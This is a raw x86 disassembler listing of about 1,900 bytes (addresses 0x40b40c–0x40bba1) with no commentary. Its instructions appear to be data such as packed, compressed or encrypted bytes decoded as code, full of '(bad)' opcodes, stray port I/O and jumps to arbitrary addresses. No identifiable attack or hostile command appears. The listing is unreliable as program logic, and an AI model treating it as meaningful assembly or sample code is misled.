  40b40c:	adc    eax,DWORD PTR [ebp+0x7281fe82]
  40b412:	mov    eax,0x5e3d6282
  40b417:	dec    ecx
  40b418:	aam    0x3e
  40b41a:	inc    esi
  40b41b:	repnz xchg ecx,eax
  40b41d:	and    BYTE PTR [ecx+0x21],bh
  40b420:	and    BYTE PTR [edi+ebp*2-0x7f89dc99],al
  40b427:	lahf   
  40b428:	addr16 pop ss
  40b42a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b42b:	test   dl,bl
  40b42d:	test   BYTE PTR [eax+0x61be686b],0x58
  40b434:	push   ebp
  40b435:	push   ecx
  40b436:	dec    ecx
  40b437:	mov    eax,ds:0xa524c08b
  40b43c:	stos   DWORD PTR es:[edi],eax
  40b43d:	bound  edx,QWORD PTR [eax]
  40b43f:	cmc    
  40b440:	lahf   
  40b441:	push   esp
  40b442:	push   cs
  40b443:	sub    ebp,esp
  40b445:	into   
  40b446:	pop    ecx
  40b447:	inc    ebx
  40b448:	aas    
  40b449:	arpl   WORD PTR [esi-0x107fbcbf],ax
  40b44f:	jae    0x40b494
  40b451:	xchg   ebx,eax
  40b452:	push   ecx
  40b453:	call   0x542b:0x4b254990
  40b45a:	(bad)  
  40b45b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b45c:	pop    es
  40b45d:	adc    ah,BYTE PTR [edi]
  40b45f:	dec    edx
  40b460:	xor    DWORD PTR [ecx],0x40
  40b463:	mov    ebx,0x6feb1cfb
  40b468:	retf   0x5cd8
  40b46b:	xchg   eax,esp
  40b46d:	jle    0x40b47e
  40b46f:	je     0x40b45f
  40b471:	call   0x48e46018
  40b476:	add    al,0x2e
  40b478:	stos   BYTE PTR es:[edi],al
  40b479:	fnstenv [eax]
  40b47b:	scas   al,BYTE PTR es:[edi]
  40b47c:	jno    0x40b4f4
  40b47e:	inc    esi
  40b47f:	jge    0x40b472
  40b481:	sub    al,0x12
  40b483:	mov    ds:0x1da40095,al
  40b488:	mov    edx,0xf3f44100
  40b48d:	(bad)  
  40b48e:	out    dx,al
  40b48f:	inc    ebx
  40b490:	xchg   edi,eax
  40b491:	or     cl,cl
  40b493:	pop    ds
  40b494:	add    DWORD PTR [eax-0x6d5280c2],edi
  40b49a:	cwde   
  40b49b:	xor    eax,DWORD PTR [ebx-0x40]
  40b49e:	nop
  40b49f:	or     al,BYTE PTR [edi+0x70]
  40b4a2:	sub    al,0x79
  40b4a4:	fimul  DWORD PTR [edx-0xdfd6b38]
  40b4aa:	lea    esi,[eax+edi*8+0x27]
  40b4ae:	out    0xe3,al
  40b4b0:	sbb    eax,0xc3121ada
  40b4b5:	js     0x40b4b8
  40b4b7:	inc    ebp
  40b4b8:	shr    edi,cl
  40b4ba:	inc    esp
  40b4bb:	fwait
  40b4bc:	cmp    edx,DWORD PTR [esp+ecx*4-0x6a]
  40b4c0:	and    esi,edi
  40b4c2:	rcl    BYTE PTR [ebx],0xe5
  40b4c5:	in     al,dx
  40b4c6:	ins    DWORD PTR es:[edi],dx
  40b4c7:	or     ch,BYTE PTR [edi-0x50f3b676]
  40b4cd:	pop    ss
  40b4ce:	mov    ax,ds:0x4cb29e3a
  40b4d4:	adc    eax,DWORD PTR ds:0xb3f3e0c4
  40b4da:	jns    0x40b4e9
  40b4dc:	xor    bl,BYTE PTR [edi+0x78]
  40b4df:	cmp    DWORD PTR [edi],ecx
  40b4e1:	pop    ds
  40b4e2:	gs pop edx
  40b4e4:	out    0x78,ax
  40b4e7:	or     eax,DWORD PTR [eax-0x6c]
  40b4ea:	lahf   
  40b4eb:	xor    BYTE PTR [edi+0x2a],dh
  40b4ee:	ret    0x285c
  40b4f1:	mov    dh,0xda
  40b4f3:	xor    eax,0x73750990
  40b4f8:	hlt    
  40b4f9:	(bad)  
  40b4fa:	push   eax
  40b4fb:	pusha  
  40b4fc:	ja     0x40b56a
  40b4fe:	jecxz  0x40b50e
  40b500:	sbb    eax,0xd49ed65a
  40b505:	pop    ebx
  40b506:	ja     0x40b4f2
  40b508:	dec    eax
  40b509:	jl     0x40b529
  40b50b:	loope  0x40b526
  40b50d:	push   es
  40b50e:	arpl   WORD PTR [eax-0x10],ax
  40b511:	in     eax,dx
  40b512:	out    0xde,al
  40b514:	ja     0x40b510
  40b516:	adc    eax,0x695fc864
  40b51b:	(bad)  
  40b51c:	(bad)  
  40b51d:	scas   eax,DWORD PTR es:[edi]
  40b51e:	xor    BYTE PTR [ebx-0x2e],bl
  40b521:	cmp    BYTE PTR [ecx],dh
  40b523:	les    edi,FWORD PTR [eax]
  40b525:	retf   0xc962
  40b528:	and    esp,DWORD PTR [esi-0xb]
  40b52b:	jge    0x40b510
  40b52d:	adc    ah,dh
  40b52f:	push   ebp
  40b530:	ret    0x4c03
  40b533:	push   es
  40b534:	jo     0x40b583
  40b536:	jmp    0x6659:0xe1270ea7
  40b53d:	stos   BYTE PTR es:[edi],al
  40b53e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b53f:	adc    DWORD PTR [ecx],edi
  40b541:	imul   eax,DWORD PTR [ecx+0x32],0x861d393b
  40b548:	sbb    DWORD PTR [ecx],ebp
  40b54a:	mov    eax,0xe955661a
  40b54f:	retf   0x3799
  40b552:	pop    ecx
  40b553:	aam    0x57
  40b555:	sbb    dl,BYTE PTR [eax+0x751c795f]
  40b55b:	jns    0x40b5a5
  40b55d:	loopne 0x40b57e
  40b55f:	adc    eax,0xc1f9eaad
  40b564:	push   bp
  40b566:	call   0x77a32409
  40b56b:	pop    es
  40b56c:	sbb    dh,BYTE PTR [edx]
  40b56e:	mov    ebp,0xa141980a
  40b573:	sub    al,0x0
  40b575:	ret    0xdb6
  40b578:	add    DWORD PTR [edx],edi
  40b57a:	or     BYTE PTR [esi-0x537892b9],bl
  40b580:	ins    BYTE PTR es:[edi],dx
  40b581:	cmp    ebx,edi
  40b583:	inc    ebp
  40b584:	cwde   
  40b585:	or     eax,0xc3b91062
  40b58a:	(bad)  [edi+0x6908fc66]
  40b590:	dec    ecx
  40b591:	mov    dl,BYTE PTR [ebp-0x23]
  40b594:	push   0x5663ff13
  40b599:	rcr    bh,1
  40b59b:	add    bl,BYTE PTR [ebx]
  40b59d:	pop    ecx
  40b59e:	fcom   st(6)
  40b5a0:	xor    al,0x29
  40b5a2:	cld    
  40b5a3:	cmp    bh,dl
  40b5a5:	or     dl,BYTE PTR [eax]
  40b5a7:	cmp    BYTE PTR [eax-0x14e26bb1],0xa0
  40b5ae:	outs   dx,DWORD PTR ds:[esi]
  40b5af:	dec    ebp
  40b5b0:	and    ebp,esp
  40b5b2:	dec    eax
  40b5b3:	fldenv [edx-0x4234a4ef]
  40b5b9:	mov    eax,ebx
  40b5bb:	push   0xffffffa9
  40b5bd:	retf   
  40b5be:	scas   al,BYTE PTR es:[edi]
  40b5bf:	int3   
  40b5c0:	js     0x40b582
  40b5c2:	fsqrt  
  40b5c4:	mov    al,0x6
  40b5c6:	ja     0x40b5d9
  40b5c8:	and    ch,0x3c
  40b5cb:	jmp    0x82d26387
  40b5d0:	cld    
  40b5d1:	cmp    eax,0xfffffff3
  40b5d4:	mov    ecx,DWORD PTR ds:0x1c12d246
  40b5da:	add    eax,0xe36aa10
  40b5df:	ins    DWORD PTR es:[edi],dx
  40b5e0:	cmc    
  40b5e1:	add    al,0xf5
  40b5e3:	xor    dl,0xa5
  40b5e6:	pop    es
  40b5e7:	cmp    eax,esi
  40b5e9:	push   0x33b70c12
  40b5ee:	test   BYTE PTR [ebx-0x61],dh
  40b5f1:	add    esp,0x11
  40b5f4:	adc    ebx,DWORD PTR [ecx-0x4e4226eb]
  40b5fa:	xor    DWORD PTR [edx],esi
  40b5fc:	fwait
  40b5fd:	(bad)  
  40b5fe:	pop    ebx
  40b5ff:	xor    BYTE PTR [esi],0xa3
  40b602:	sbb    al,0x7d
  40b604:	xor    eax,0x5008eff5
  40b609:	ins    DWORD PTR es:[edi],dx
  40b60a:	inc    edx
  40b60b:	and    DWORD PTR [eax+ebx*1-0x24],esi
  40b60f:	in     al,dx
  40b610:	xor    al,0xaf
  40b612:	rol    BYTE PTR [eax-0x2eb21a04],0x8b
  40b619:	cli    
  40b61a:	sub    BYTE PTR [eax+0xffc7b78],dh
  40b620:	mov    esi,0xdfa975e
  40b625:	call   0x80f59972
  40b62a:	or     ecx,ebx
  40b62c:	and    dl,BYTE PTR [eax+0x55]
  40b62f:	push   es
  40b630:	(bad)
  40b633:	mov    DWORD PTR [edx-0x3edb90ff],ebp
  40b639:	cmp    al,bl
  40b63b:	out    0xe8,eax
  40b63d:	(bad)  
  40b63e:	gs push 0x92300b4
  40b644:	mov    bh,bl
  40b646:	ins    BYTE PTR es:[edi],dx
  40b647:	add    eax,0x778474ca
  40b64c:	push   ebp
  40b64d:	cld    
  40b64e:	test   al,0x60
  40b650:	adc    ah,cl
  40b652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b653:	aam    0x79
  40b655:	sbb    al,0x1c
  40b657:	popf   
  40b658:	jne    0x40b670
  40b65a:	fwait
  40b65b:	xor    dl,bh
  40b65d:	mov    al,ds:0xddf04f5e
  40b662:	enter  0x6398,0x9
  40b666:	jl     0x40b601
  40b668:	daa    
  40b669:	ds xchg ebx,eax
  40b66b:	mov    DWORD PTR ds:0xb9247981,ecx
  40b671:	jbe    0x40b6a0
  40b673:	mov    bl,0x43
  40b675:	clc    
  40b676:	int3   
  40b677:	pusha  
  40b678:	aad    0x84
  40b67a:	out    0xab,eax
  40b67c:	xchg   DWORD PTR [eax+ebx*4+0x22a9daeb],esi
  40b683:	fs (bad) 
  40b685:	pusha  
  40b686:	jbe    0x40b6f1
  40b688:	xchg   ecx,eax
  40b689:	cmc    
  40b68a:	fnstcw WORD PTR [ebx-0x16278d9]
  40b690:	cmp    cl,BYTE PTR [ebp+0x5]
  40b693:	jecxz  0x40b673
  40b695:	push   ds
  40b696:	std    
  40b697:	lea    ebp,[edx]
  40b699:	outs   dx,BYTE PTR ds:[esi]
  40b69a:	xchg   ebp,eax
  40b69b:	fisubr DWORD PTR [ebx-0x25]
  40b69e:	cmp    esp,0xdec9c5a8
  40b6a4:	call   0xa222bf46
  40b6a9:	jp     0x40b683
  40b6ab:	pop    edi
  40b6ac:	adc    eax,0xea581bc4
  40b6b1:	imul   DWORD PTR [ebp+0x5d0c64c1]
  40b6b7:	sub    bh,BYTE PTR ds:0xb53573c6
  40b6bd:	mov    al,0x83
  40b6bf:	push   cs
  40b6c0:	mov    esp,0x58f1bec5
  40b6c5:	sub    esi,DWORD PTR [esi+0x35]
  40b6c8:	mov    dh,0x63
  40b6ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6cb:	push   0x4f1f23c3
  40b6d0:	test   al,0xd8
  40b6d2:	inc    ecx
  40b6d3:	bound  edi,QWORD PTR [eax]
  40b6d5:	or     dl,BYTE PTR [ecx+0x79f8e3b5]
  40b6db:	test   bl,dl
  40b6dd:	dec    ebx
  40b6de:	test   DWORD PTR [ebx-0x32a15e82],edi
  40b6e4:	lock adc cl,ch
  40b6e7:	repz cmp dl,ah
  40b6ea:	out    0xd2,al
  40b6ec:	cmc    
  40b6ed:	es and dh,al
  40b6f0:	rcl    edx,cl
  40b6f2:	jo     0x40b68a
  40b6f4:	dec    esp
  40b6f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6f6:	lea    ebp,ds:0xce2aba1a
  40b6fc:	fwait
  40b6fd:	pop    ss
  40b6fe:	pop    esi
  40b700:	mov    esp,0x554ebfa4
  40b705:	jno    0x40b755
  40b707:	cmp    DWORD PTR [ebx],esi
  40b709:	lock int3 
  40b70b:	call   0xbf86aa78
  40b710:	pop    edx
  40b711:	test   al,0xe9
  40b713:	jno    0x40b6db
  40b715:	mov    ds:0x1e05a4ca,eax
  40b71a:	int    0xcb
  40b71c:	push   edx
  40b71d:	(bad)  
  40b71e:	scas   al,BYTE PTR es:[edi]
  40b71f:	pop    ecx
  40b720:	fwait
  40b721:	push   ds
  40b722:	push   cs
  40b723:	test   esp,ecx
  40b725:	loop   0x40b78a
  40b727:	dec    ecx
  40b728:	inc    ebx
  40b729:	mov    fs,WORD PTR [edx-0x5a98220c]
  40b72f:	sbb    ecx,DWORD PTR [ecx-0x2a]
  40b732:	xor    al,0x29
  40b734:	push   edx
  40b735:	mov    ebp,0x4b330f7
  40b73a:	add    eax,0xccaea865
  40b73f:	jg     0x40b775
  40b741:	mov    esp,0x1dbf4abe
  40b746:	jbe    0x40b796
  40b748:	sub    BYTE PTR [esi+0xdf3195b],dl
  40b74e:	lods   al,BYTE PTR ds:[esi]
  40b74f:	outs   dx,BYTE PTR ds:[esi]
  40b750:	data16 or BYTE PTR ds:[esi+0x3b],ch
  40b755:	cmp    BYTE PTR [edi+0x77],dl
  40b758:	bound  esi,QWORD PTR [eax+0x7e]
  40b75b:	or     DWORD PTR [esi],ecx
  40b75d:	mov    ds:0xb560b77e,al
  40b762:	in     al,dx
  40b763:	xchg   ch,dh
  40b765:	ss mov edx,0xf13871f7
  40b76b:	shr    DWORD PTR [esi-0x2ed0ced2],cl
  40b771:	dec    ecx
  40b772:	mov    ah,0xb
  40b774:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b775:	xor    BYTE PTR [esi],dl
  40b777:	sbb    DWORD PTR [eax+0x36d09a1],eax
  40b77d:	add    ebp,DWORD PTR [ebp-0x3a791fca]
  40b783:	fwait
  40b784:	std    
  40b785:	push   edx
  40b786:	in     eax,dx
  40b787:	jae    0x40b7f7
  40b789:	jmp    0x4348cfb5
  40b78e:	dec    ecx
  40b78f:	iret   
  40b790:	jle    0x40b762
  40b792:	int3   
  40b793:	(bad)  
  40b794:	mov    eax,DWORD PTR [ebp+0x6b]
  40b797:	jmp    DWORD PTR [esi]
  40b799:	cmp    ah,cl
  40b79b:	addr16 mov ds:0x1459,al
  40b79f:	jle    0x40b797
  40b7a1:	std    
  40b7a2:	adc    ah,BYTE PTR [ebx+0x95c9e32]
  40b7a8:	and    DWORD PTR [edx+0x356dadb1],eax
  40b7ae:	dec    ebx
  40b7af:	pop    ecx
  40b7b0:	sub    edi,DWORD PTR [ebx+0x4265b52e]
  40b7b6:	lahf   
  40b7b7:	rol    BYTE PTR [ecx],1
  40b7b9:	sub    BYTE PTR [eax],0xbd
  40b7bc:	ret    0xf2a2
  40b7bf:	daa    
  40b7c0:	xchg   edi,eax
  40b7c1:	adc    esp,DWORD PTR [eax]
  40b7c3:	sbb    eax,0x910fadca
  40b7c8:	jno    0x40b7b9
  40b7ca:	pop    es
  40b7cb:	repnz test DWORD PTR [eax+edx*1-0x1d],esp
  40b7d0:	dec    esi
  40b7d1:	int    0x46
  40b7d3:	jmp    0xaa88db0d
  40b7d8:	sbb    edx,DWORD PTR [ebx+esi*4-0x4541f56a]
  40b7df:	or     BYTE PTR [edx+0x32],bh
  40b7e2:	in     al,0x58
  40b7e4:	in     eax,dx
  40b7e5:	dec    eax
  40b7e6:	pop    esi
  40b7e8:	repnz or edi,esp
  40b7eb:	add    ch,BYTE PTR [edx+0x39436274]
  40b7f1:	pop    ss
  40b7f2:	mov    WORD PTR [ecx+0x6],ds
  40b7f5:	std    
  40b7f6:	imul   edi,DWORD PTR ds:0x18f58c2d,0x6963b455
  40b800:	cmc    
  40b801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b802:	dec    esp
  40b803:	and    BYTE PTR [edx],bh
  40b805:	ins    BYTE PTR es:[edi],dx
  40b806:	dec    ebp
  40b807:	pop    ss
  40b808:	lods   eax,DWORD PTR ds:[esi]
  40b809:	cmc    
  40b80a:	loop   0x40b792
  40b80c:	sbb    DWORD PTR [eax+0x2328ec39],edx
  40b812:	xchg   edx,eax
  40b814:	stc    
  40b815:	test   al,0xd
  40b817:	pop    ebp
  40b818:	mov    bh,0xb3
  40b81a:	out    dx,al
  40b81b:	add    DWORD PTR [edi+0x213f33ad],esp
  40b821:	popa   
  40b822:	idiv   BYTE PTR [eax-0x55f79c1]
  40b828:	test   dl,ch
  40b82a:	ret    0x6d10
  40b82d:	add    DWORD PTR [edi+edx*4],ebx
  40b830:	pop    edx
  40b831:	push   ds
  40b832:	mov    edx,0x9c81093b
  40b837:	push   ds
  40b838:	inc    edi
  40b839:	or     eax,0x8610c9c9
  40b83e:	sbb    al,BYTE PTR [eax+0x216e592e]
  40b844:	push   eax
  40b845:	mov    cl,0xaf
  40b847:	sar    DWORD PTR [ecx],0xfd
  40b84a:	and    ebx,DWORD PTR [edx+0x1d39dbac]
  40b850:	or     dh,bh
  40b852:	retf   0xec71
  40b855:	xor    ebp,eax
  40b857:	stc    
  40b858:	xchg   edi,eax
  40b859:	mov    ch,0xb0
  40b85b:	mov    al,ds:0xd1ffa818
  40b860:	out    0x6c,eax
  40b862:	xor    al,ch
  40b864:	jmp    0x40b8c0
  40b866:	retf   
  40b867:	iret   
  40b868:	mov    bh,0x4f
  40b86a:	ficomp WORD PTR [esi-0x1170c715]
  40b870:	mul    BYTE PTR [esi-0x4cdf509a]
  40b876:	jae    0x40b83e
  40b878:	lods   eax,DWORD PTR ds:[esi]
  40b879:	inc    ebx
  40b87a:	or     DWORD PTR [edi+ebx*4-0x45484c60],ebx
  40b881:	repz in eax,dx
  40b883:	mov    ah,dl
  40b885:	div    DWORD PTR [eax+0x2d]
  40b888:	into   
  40b889:	jmp    0x40b817
  40b88b:	push   eax
  40b88c:	mov    ds:0x26c7a62a,eax
  40b892:	mov    WORD PTR [esi+0x7c047813],?
  40b898:	or     esi,esi
  40b89a:	mov    edi,0xceda8a6b
  40b89f:	(bad)  
  40b8a0:	xchg   ecx,eax
  40b8a1:	cmc    
  40b8a2:	or     DWORD PTR [ebx],0xffffff92
  40b8a5:	fwait
  40b8a6:	and    eax,0x82446cec
  40b8ab:	xlat   BYTE PTR ds:[ebx]
  40b8ac:	jbe    0x40b86d
  40b8ae:	or     DWORD PTR [ebx-0x7646a28],0xc9a739f8
  40b8b8:	push   ebp
  40b8b9:	sar    dh,0xf8
  40b8bc:	adc    DWORD PTR [ebx+0x4abb6d93],eax
  40b8c2:	enter  0xe668,0xfa
  40b8c6:	cs or  al,0x47
  40b8c9:	add    esi,DWORD PTR [ebx+0x229dbe3e]
  40b8cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8d0:	mov    ebx,0xcca4a24d
  40b8d5:	add    bh,BYTE PTR [edx-0x61]
  40b8d8:	test   al,0xd8
  40b8da:	push   ebp
  40b8db:	xor    DWORD PTR [ebp-0x31],edi
  40b8de:	iret   
  40b8df:	gs inc ebx
  40b8e1:	sub    DWORD PTR [edx-0x43124738],0x5d
  40b8e8:	or     dh,dl
  40b8ea:	sbb    eax,0xc3bb36bb
  40b8ef:	mov    ds:0x637fb743,al
  40b8f4:	jo     0x40b961
  40b8f6:	out    0x74,eax
  40b8f8:	and    al,0xb5
  40b8fa:	(bad)  
  40b8fb:	dec    edx
  40b8fc:	or     BYTE PTR [edi],dh
  40b8fe:	push   ds
  40b8ff:	cmp    DWORD PTR [edx+eax*8-0x174edc3e],eax
  40b906:	mov    edx,DWORD PTR [edx]
  40b908:	imul   ebp,DWORD PTR [ecx+0x2ae82e34],0x9eb09d5f
  40b912:	push   ds
  40b913:	jle    0x40b92c
  40b915:	jne    0x40b8d5
  40b917:	sub    al,0x85
  40b919:	and    BYTE PTR [esi],cl
  40b91b:	loop   0x40b8b6
  40b91d:	outs   dx,DWORD PTR ds:[esi]
  40b91e:	(bad)  
  40b91f:	xor    ebp,DWORD PTR [ebp+esi*2-0x18]
  40b923:	dec    esi
  40b924:	jo     0x40b992
  40b926:	mov    ecx,0x6c597b98
  40b92b:	in     al,0x49
  40b92d:	out    0xc8,al
  40b92f:	clc    
  40b930:	test   eax,0x32ee9bd
  40b935:	and    ebx,esp
  40b937:	cli    
  40b938:	sbb    al,0x2b
  40b93a:	and    BYTE PTR [eax+0xa5bf478],bh
  40b940:	jmp    0x40b924
  40b942:	xchg   ebp,eax
  40b943:	mov    dl,0x5d
  40b945:	cwde   
  40b946:	jae    0x40b919
  40b948:	aam    0xeb
  40b94a:	je     0x40b93c
  40b94c:	dec    esi
  40b94d:	cmp    bh,dh
  40b94f:	jp     0x40b919
  40b951:	mov    dh,0x7f
  40b953:	push   esp
  40b954:	fnstsw WORD PTR [edx]
  40b956:	outs   dx,BYTE PTR ds:[esi]
  40b957:	mov    ah,0x35
  40b959:	or     eax,0xc23f0bca
  40b95e:	test   al,0xb7
  40b960:	xor    dl,BYTE PTR [esi-0x37]
  40b963:	inc    eax
  40b964:	pop    edx
  40b965:	pushf  
  40b966:	popf   
  40b967:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b968:	sub    al,0x82
  40b96a:	aam    0xac
  40b96c:	add    ch,BYTE PTR [ebx+0x1b866fe]
  40b972:	mov    ah,0xeb
  40b974:	or     edx,esp
  40b976:	xor    ah,BYTE PTR [edi+0x5]
  40b979:	sbb    eax,0xf000c2f7
  40b97e:	jecxz  0x40b9f5
  40b980:	loopne 0x40b960
  40b982:	inc    edx
  40b983:	pusha  
  40b984:	mov    eax,cs
  40b986:	push   edi
  40b987:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b988:	ror    DWORD PTR [ecx+0x57],0x50
  40b98c:	inc    ebp
  40b98d:	(bad)  [ebx]
  40b98f:	(bad)  
  40b990:	rol    BYTE PTR [edi],cl
  40b992:	xchg   edi,eax
  40b993:	jmp    0x9676:0x60718509
  40b99a:	and    eax,0xcda1e465
  40b99f:	idiv   BYTE PTR [ecx+0x4c]
  40b9a2:	mov    bl,0x1e
  40b9a4:	mov    edi,0x8be4b2b6
  40b9a9:	repnz adc al,0x45
  40b9ac:	fidiv  WORD PTR [edx+eiz*4-0x56]
  40b9b0:	scas   eax,DWORD PTR es:[edi]
  40b9b1:	scas   al,BYTE PTR es:[edi]
  40b9b2:	dec    ebp
  40b9b3:	and    ebp,DWORD PTR [ecx+ebx*8]
  40b9b6:	fdivr  QWORD PTR [eax+0x5]
  40b9b9:	xor    ecx,DWORD PTR [ebx-0x66]
  40b9bc:	cs pop esp
  40b9be:	or     al,0x85
  40b9c0:	mov    dh,0xd6
  40b9c2:	(bad)  
  40b9c3:	xchg   esp,eax
  40b9c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9c5:	dec    edi
  40b9c6:	gs adc esp,0x91ad2437
  40b9cd:	sbb    eax,0x7f00befb
  40b9d2:	sbb    ebp,ecx
  40b9d4:	sti    
  40b9d5:	mov    fs,edi
  40b9d7:	xchg   BYTE PTR [ecx],ah
  40b9d9:	imul   DWORD PTR [ebp+0x70c32b09]
  40b9df:	xor    DWORD PTR [eax-0x15],ebp
  40b9e2:	inc    edi
  40b9e3:	xchg   BYTE PTR [ebp+edi*4-0x3b],al
  40b9e7:	es loope 0x40b9f3
  40b9ea:	(bad)  
  40b9eb:	xor    dh,BYTE PTR [ebp-0x38298e83]
  40b9f1:	lea    esp,[edx+0x4557640f]
  40b9f7:	fs aad 0x38
  40b9fa:	mov    ?,WORD PTR [ebp+0x6c]
  40b9fd:	outs   dx,BYTE PTR ds:[esi]
  40b9fe:	inc    edx
  40b9ff:	mov    dl,0x16
  40ba01:	ins    BYTE PTR es:[edi],dx
  40ba02:	in     al,0xef
  40ba04:	adc    dl,0xcb
  40ba07:	jnp    0x40b9a8
  40ba09:	mov    bl,0xcd
  40ba0b:	mov    ds:0xcf02e98d,eax
  40ba10:	cs mov al,0x68
  40ba13:	cmp    al,0xb1
  40ba15:	fist   DWORD PTR [ecx+0x5c]
  40ba18:	cwde   
  40ba19:	test   eax,0x10c9e117
  40ba1e:	mov    ecx,0x689adcd4
  40ba23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba24:	mov    ch,0xaa
  40ba26:	mov    ds:0x8bf12125,eax
  40ba2b:	sbb    esi,esi
  40ba2d:	inc    eax
  40ba2e:	dec    ebx
  40ba2f:	loop   0x40b9e9
  40ba31:	ror    BYTE PTR [ebp+0x199ce5e2],cl
  40ba37:	xchg   edi,eax
  40ba38:	daa    
  40ba39:	push   ebx
  40ba3a:	aaa    
  40ba3b:	sti    
  40ba3c:	test   al,0x56
  40ba3e:	and    ebp,esp
  40ba40:	mov    bh,BYTE PTR [ebx+0x3a]
  40ba43:	sti    
  40ba44:	xchg   BYTE PTR [eax],al
  40ba46:	jl     0x40ba00
  40ba48:	call   0x6264d9e5
  40ba4d:	int    0xc
  40ba4f:	mov    ch,0xe
  40ba51:	or     DWORD PTR [ecx+esi*4-0x1d],ebp
  40ba55:	push   esp
  40ba56:	sbb    ecx,DWORD PTR [ecx+0x5]
  40ba59:	test   dl,bl
  40ba5b:	cli    
  40ba5c:	stos   DWORD PTR es:[edi],eax
  40ba5d:	ja     0x40ba53
  40ba5f:	jae    0x40ba5c
  40ba61:	aas    
  40ba62:	(bad)  
  40ba63:	fstp   DWORD PTR [ebp+0x68]
  40ba66:	jge    0x40bad8
  40ba68:	call   0x6f14214d
  40ba6d:	pop    edx
  40ba6e:	or     DWORD PTR gs:[eax-0x6e],esi
  40ba72:	cmp    DWORD PTR [edx-0x1f3188fe],eax
  40ba78:	xor    BYTE PTR [eax+0x7b],ah
  40ba7b:	sti    
  40ba7c:	adc    edi,DWORD PTR [ecx+0x61208125]
  40ba82:	mov    ebx,0x9ce25699
  40ba87:	aad    0xbb
  40ba89:	scas   eax,DWORD PTR es:[edi]
  40ba8a:	cld    
  40ba8b:	dec    esi
  40ba8c:	addr16 out dx,al
  40ba8e:	nop
  40ba8f:	scas   al,BYTE PTR es:[edi]
  40ba90:	mov    cs,WORD PTR [ebp+0x6e]
  40ba93:	sahf   
  40ba94:	push   ecx
  40ba95:	out    dx,eax
  40ba96:	push   ds
  40ba97:	sub    esi,DWORD PTR [esi+0x5d]
  40ba9a:	xchg   ebx,eax
  40ba9b:	cmovnp ecx,DWORD PTR [edi+0x403d6946]
  40baa2:	mov    fs,WORD PTR [ebp-0x46]
  40baa5:	push   ecx
  40baa6:	inc    ebx
  40baa7:	sbb    bl,bh
  40baa9:	cmp    eax,0x3bb8159b
  40baae:	(bad)  
  40baaf:	clc    
  40bab0:	je     0x40bad0
  40bab2:	xchg   bl,ah
  40bab4:	loope  0x40bafe
  40bab6:	loop   0x40bac1
  40bab8:	ret    0x8048
  40babb:	cs iret 
  40babd:	adc    DWORD PTR [ebx],esp
  40babf:	push   ds
  40bac0:	fild   DWORD PTR [eax+0x6e]
  40bac3:	cmp    BYTE PTR [ebp+0x13e49f33],ch
  40bac9:	ja     0x40bae1
  40bacb:	mov    ah,0x7d
  40bacd:	and    DWORD PTR [edi-0x5bbc1a46],ebp
  40bad3:	push   0xe6a33493
  40bad8:	ins    BYTE PTR es:[edi],dx
  40bad9:	push   0x7ad840d7
  40bade:	pop    edx
  40badf:	inc    DWORD PTR [edx-0x3857a2ee]
  40bae5:	aaa    
  40bae6:	mov    cl,0x83
  40bae8:	push   ecx
  40baea:	leave  
  40baeb:	cmp    DWORD PTR [ebp-0x3874cc9],0xcaaee865
  40baf5:	jecxz  0x40ba84
  40baf7:	inc    edx
  40baf8:	pop    esi
  40baf9:	mov    ah,0x26
  40bafb:	pop    edx
  40bafc:	rcl    BYTE PTR [ebx-0x23],0xba
  40bb00:	xor    BYTE PTR ds:0x50d49b31,bl
  40bb06:	adc    BYTE PTR [ebx+0x78],0xd8
  40bb0a:	repz cdq 
  40bb0c:	ficom  DWORD PTR [edx-0x10ed4f65]
  40bb12:	std    
  40bb13:	adc    BYTE PTR [ecx],ah
  40bb15:	das    
  40bb16:	outs   dx,DWORD PTR ds:[esi]
  40bb17:	imul   ecx,DWORD PTR [edx],0xc2c20c20
  40bb1d:	pop    esp
  40bb1e:	dec    edi
  40bb1f:	cmp    al,BYTE PTR [ebx+0x747c4964]
  40bb25:	aam    0x2
  40bb27:	ja     0x40bb3f
  40bb29:	cmc    
  40bb2a:	pop    es
  40bb2b:	and    edx,DWORD PTR [edi-0x52656369]
  40bb31:	mov    dh,0x6b
  40bb33:	mov    edx,0x6e6a8115
  40bb38:	call   0x2b7cecf1
  40bb3d:	push   ds
  40bb3e:	mov    DWORD PTR [ebx+ecx*1-0x70],edi
  40bb42:	data16 ficomp WORD PTR [edi-0x74]
  40bb46:	push   ss
  40bb47:	jo     0x40bae3
  40bb49:	(bad)  
  40bb4a:	fmul   DWORD PTR [edi+0x50cda2fd]
  40bb50:	adc    BYTE PTR ds:0xab419f59,0x4a
  40bb57:	jne    0x40bae9
  40bb59:	dec    eax
  40bb5a:	add    ebp,DWORD PTR [edi]
  40bb5c:	arpl   ax,dx
  40bb5e:	pushf  
  40bb5f:	and    eax,0xed91521c
  40bb64:	inc    ecx
  40bb65:	adc    esi,DWORD PTR [ebx+ebx*8]
  40bb68:	pop    ss
  40bb69:	jmp    0x40bb5a
  40bb6b:	bound  eax,QWORD PTR ds:0x74378039
  40bb71:	dec    ecx
  40bb72:	jecxz  0x40bb59
  40bb74:	jmp    0x40bbf3
  40bb76:	fld    DWORD PTR [eax+esi*4+0x5b]
  40bb7a:	sub    eax,0x5e69d047
  40bb7f:	and    bl,BYTE PTR [edx]
  40bb81:	mov    eax,0x9fcbbd34
  40bb86:	dec    ebp
  40bb87:	int3   
  40bb88:	jl     0x40bbe6
  40bb8a:	fcom   DWORD PTR [ecx]
  40bb8c:	push   ds
  40bb8d:	pmaddwd mm3,mm2
  40bb90:	and    DWORD PTR ds:0xd9e65890,0x18c1595e
  40bb9a:	shl    BYTE PTR [edx],1
  40bb9c:	mov    esi,0xe4cd446f
  40bba1:	or     eax,0x1db29023
